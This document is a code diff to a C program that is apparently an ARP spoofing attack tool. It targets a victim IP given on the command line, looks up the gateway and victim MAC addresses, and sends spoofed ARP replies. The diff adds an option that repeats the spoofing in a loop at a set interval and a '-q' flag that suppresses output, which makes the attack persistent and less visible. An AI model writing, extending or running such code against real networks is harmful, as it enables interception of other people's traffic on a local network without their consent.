@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
+#include <unistd.h>
 #include <errno.h>
 
 #include <sys/socket.h>
@@ -25,6 +26,7 @@
 
 #define DIE(format, error)                               \
 	do {                                             \
+		fprintf(stderr, "Error: ");              \
 		fprintf(stderr, format, error);          \
 		exit(EXIT_FAILURE);                      \
 	} while (0)
@@ -33,8 +35,8 @@ uint32_t get_gateway(void)
 {
 	uint32_t ret;
 	char buf[1024];
-	char interface[] = INTERFACE;
-	char seps[] = " \t";
+	const char interface[] = INTERFACE;
+	const char seps[] = " \t";
 	FILE *f = fopen("/proc/net/route", "r");
 
 	/* hooray for ugly hacks */
@@ -179,7 +181,17 @@ void arp_spoof(int fd, const unsigned char *victim_mac, const char *victim_ip, u
 int main(int argc, char *argv[])
 {
 	if (argc < 2) {
-		DIE("%s\n", "Please give an IP address to attack");
+		DIE("%s\n", "please give an IP address to attack");
+	}
+
+	int repeat = 0;
+	if (argc > 2) {
+		repeat = strtoul(argv[2], NULL, 10);
+	}
+
+	int quiet = 0;
+	if (argc > 3 && !strcmp(argv[3], "-q")) {
+		quiet = 1;
 	}
 
 	/* get an ARP socket */
@@ -192,12 +204,27 @@ int main(int argc, char *argv[])
 	uint32_t gateway_ip = get_gateway();
 
 	request_mac(fd, &req, inet_ntoa((struct in_addr) { .s_addr = gateway_ip }));
-	PRINT_MAC("Gateway MAC address", req.arp_sha);
+	if (!quiet) PRINT_MAC("Gateway MAC address", req.arp_sha);
 
 	request_mac(fd, &req, argv[1]);
-	PRINT_MAC("Victim MAC address", req.arp_sha);
+	if (!quiet) PRINT_MAC("Victim MAC address", req.arp_sha);
 
 	arp_spoof(fd, req.arp_sha, argv[1], gateway_ip);
+
+	unsigned int count = 1;
+	while (repeat) {
+		arp_spoof(fd, req.arp_sha, argv[1], gateway_ip);
+		sleep(repeat);
+
+		if (!quiet) {
+			printf(".");
+			if (count % 50 == 0)
+				printf("\n");
+		}
+
+		fflush(stdout);
+		++count;
+	}
 
 	return 0;
 }
